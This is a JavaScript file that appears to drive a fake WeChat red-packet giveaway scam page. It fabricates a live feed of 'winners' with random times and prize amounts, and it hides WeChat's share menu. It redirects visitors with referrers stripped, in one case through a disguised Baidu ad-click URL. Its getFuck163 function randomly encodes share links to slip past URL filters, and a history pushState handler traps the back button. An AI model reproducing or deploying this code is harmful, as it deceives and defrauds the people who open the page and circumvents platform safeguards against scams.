window.gConfig = window['data'] || {};
if (!Array.prototype.shuffle) {
    Array.prototype.shuffle = function() {
        for (var j, x, i = this.length; i; j = parseInt(Math.random() * i), x = this[--i], this[i] = this[j], this[j] = x);
        return this;
    };
}

function pad(num, size) {
    var s = num + "";
    while (s.length < size) s = "0" + s;
    return s;
}

function getFuck163() {
    var strList = [];
    for (var i = 0; i < 10; i++) {
        strList.push('%' + pad(1 + Math.round(Math.random() * 18), 2));
    }
    return strList.join('');
}

var config = {
    tpl: {
        body: M.decode(window['pagebody']),
        userItem: M.decode("PGxpIGNsYXNzPSJhbmltYXRlZCIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij48ZGl2IGNsYXNzPSJsaXN0LWl0ZW0tbGVmdCI+PGltZyBzcmM9IiUoYXZhdGFyKSI+PGRpdiBjbGFzcz0iaXRlbS1pbmZvIj48cCBjbGFzcz0iaXRlbS1pbmZvLW5hbWUiPiUobmFtZSk8L3A+PHAgY2xhc3M9Iml0ZW0taW5mby10aW1lIj4lKHRpbWUpPC9wPiA8L2Rpdj4gPC9kaXY+IDxkaXYgY2xhc3M9Imxpc3QtaXRlbS1yaWdodCI+6aKG5Y+WIDxzcGFuPiUobW9uZXkp5YWDPC9zcGFuPiA8L2Rpdj48L2xpPg==")
    }
};


var userList = JSON.parse(M.decode(window['userlist']));
userList.shuffle();
var userTimer = 0;
var showIndex = 0;
var itemWidth = '';
var actionTimer = 2500;
var newurl = '';


function pad(num, size) {
    var s = num + "";
    while (s.length < size) s = "0" + s;
    return s;
}

function jumpToShare(url) {
    $("head").append('<style type="text/css">body{font-size:16px;line-height:1.4;font-family:-apple-system-font,Helvetica Neue,sans-serif}*{padding:0;margin:0}.toast{transition-duration:.2s;transform:translate(-50%,-50%);margin:0;top:45%;z-index:2000;position:fixed;width:7.6em;min-height:7.6em;left:50%;background:hsla(0,0%,7%,.7);text-align:center;border-radius:5px;color:#fff}.toast.toast--visible{opacity:1;visibility:visible}.icon_toast.loading{margin:30px 0 0;width:38px;height:38px;vertical-align:baseline}.icon_toast{font-size:55px;color:#fff}.loading{display:inline-block;animation:e 1s steps(12) infinite;background:transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAiIGhlaWdodD0iMTIwIiB2aWV3Qm94PSIwIDAgMTAwIDEwMCI+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTAgMGgxMDB2MTAwSDB6Ii8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjRTlFOUU5IiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgLTMwKSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iIzk4OTY5NyIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgzMCAxMDUuOTggNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjOUI5OTlBIiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKDYwIDc1Ljk4IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0EzQTFBMiIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSg5MCA2NSA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNBQkE5QUEiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoMTIwIDU4LjY2IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0IyQjJCMiIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgxNTAgNTQuMDIgNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjQkFCOEI5IiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKDE4MCA1MCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNDMkMwQzEiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTE1MCA0NS45OCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNDQkNCQ0IiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTEyMCA0MS4zNCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNEMkQyRDIiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTkwIDM1IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0RBREFEQSIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgtNjAgMjQuMDIgNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjRTJFMkUyIiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKC0zMCAtNS45OCA2NSkiLz48L3N2Zz4=) no-repeat;background-size:100%}i{font-style:italic}@keyframes e{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}</style>');
    $("body").css("background", "white").find("*").remove();
    $("body").append('<div class="toast loading_toast toast--visible"><div><i class="loading icon_toast"></i></div><p class="toast_content">&#x6B63;&#x5728;&#x8FDB;&#x5165;</p></div>');
    setTimeout(function() {
        window.share_url = window.share_url.replace(/{fuck163}/ig, getFuck163());
        jump(M.addParam(window.share_url, {
            money: gConfig.money
        }));
    }, 10)
}

function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

function addUser() {
    if (showIndex === userList.length) {
        showIndex = 0;
    }
    var $item = $(config.tpl.userItem.jstpl_format(userList[showIndex++]));
    $('.index-show-more-body .list').prepend($item);
    $item.slideDown(1000);

    $('.index-show-more-body .list li').each(function(index, item) {
        if (index > 6) {
            $(item).slideUp(1000);
            setTimeout(function() {
                $(item).remove();
            }, 1000);
        }
    });
}

function startTimer() {
    clearTimeout(userTimer);
    userTimer = setTimeout(function() {
        addUser();
        startTimer();
    }, actionTimer);
}
function initUser() {
    var now = +new Date();
    $(userList).each(function(index, item) {
        var temp = new Date((now - Math.random() * 600000));
        var minutes = temp.getMinutes();
        if (minutes < 10) {
            minutes = '0' + minutes;
        }
        var timeStr = temp.getHours() + ':' + minutes;
        item.time = timeStr;
    });
    for (showIndex = 0; showIndex < 6; showIndex++) {
        var item = config.tpl.userItem.jstpl_format(userList[showIndex]);
        $('.index-show-more-body .list').prepend($(item).css('display',''));
    }
    addUser();
    startTimer();
}

function initPage() {
    gConfig.money = parseInt((parseFloat(Math.random() * 20) + 30) * 100);
    gConfig.lingqunum = parseInt((parseFloat(Math.random() * 20) + 50) * 100);
    M.resetFont();
    $(document.body).append(config.tpl.body.jstpl_format({
        head: gConfig.headimg ? gConfig.headimg : jroot + "/80.jpg",
        huodongname: unescape(gConfig.actname ? gConfig.actname : '2019%u732A%u5E74%u732E%u793C%20%u5168%u6C11%u9001%u597D%u793C'),
        lingqunum: gConfig.lingqunum,
        fafangnum: gConfig.lingqunum
    }));
    $('.index-show-more-body').show();
    $('.js_money').text(parseFloat(gConfig.money / 100).toFixed(2));
    initUser();

}

function openPacket() {
    goshare();
}


function _no_referrer_jump(a) {
    if (a) {
        var b = document.createElement("a");
        b.setAttribute("rel", "noreferrer"), b.setAttribute("href", a), document.getElementsByTagName("head")[0].appendChild(b), b.click();
    }
}


function bindEvent() {

    $(document.body).on('click', '.btn-open-red-packet', function() {
        var $this = $('.btn-open-red-packet');
        if ($this.hasClass('open')) {
            return false;
        }
        $this.addClass('open');
        //goShare();
        setTimeout(function() {
            $('.index-show-more-body').fadeOut(700);
            $('.award-body').fadeIn(700);
        }, 1500);
        //record('play', site);
        //evkey && record('play', evkey);
    });

    $(document.body).on('click', '.charge-btn', function() {
        document.title = '请稍等...';
        if (newurl.indexOf("jihuo") != -1) {
            _no_referrer_jump("http://click.bes.baidu.com/adx.php?c=cz03NTU0YzE5NDAwOGFlODM1AHQ9MTU0NjY1NzcyNgBzZT0xAGJ1PTY0MTgwNDEAdHU9dTE1NDg0NTgAYWQ9MTU0MzkxNjU4MDcwOQBzaXRlPWh0dHA6Ly92LjM5Lm5ldC8Adj0xAGk9ZjYwNzMzM2U&k=dz05NjAAaD05MABjc2lkPTM4NjU0NzA1NzYwMAB0bT0xMDc0Mjg0AHRkPTE1NDg0NTgAd2k9NjQxODA0MQBmbj0zOW5ldDAwMl9jcHIAZmFuPQB1aWQ9MjI4MTQ3NTkAY2g9MABvcz0wAGJyPTEyAGlwPTExNy42MS4yMDIuMjIzAHNzcD0xAGFwcF9pZD0AYXBwX3NpZD0Ac2RrX3ZlcnNpb249AHR0cD0xAGNvbXBsZT0wAHN0eXBlPTAAY2htZD0wAHNjaG1kPTAAeGlwPQBkdHA9MQBjbWF0Y2g9MjAwAGZpcnN0X3JlZ2lvbj0xOQBzZWNvbmRfcmVnaW9uPTYyAGJidD0xAGFidD0xAG50dHA9MQBhZGNsYXNzPTA&url=http%3A%2F%2Fivy.pcauto.com.cn%2Fclick%3Fadid%3D418634%26id%3Dpc.cpdq.zdym.sjyc1.%26url%3D" + encodeURIComponent(encodeURIComponent(newurl)));
        } else {
            _no_referrer_jump(newurl);
        }
    });

}





function init() {
    //record('load', site);
    //evkey && record('load', evkey);
    initPage();
    bindEvent();
    newurl = shareUrl + "&__money=" + (gConfig.money / 100).toFixed(2) + "&";
}

document.addEventListener('WeixinJSBridgeReady',
    function onBridgeReady() {
        WeixinJSBridge.call('hideOptionMenu');
    });


init();



function anchor() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime())
}
setTimeout(anchor, 200);
window.onhashchange = function() {
    back()
};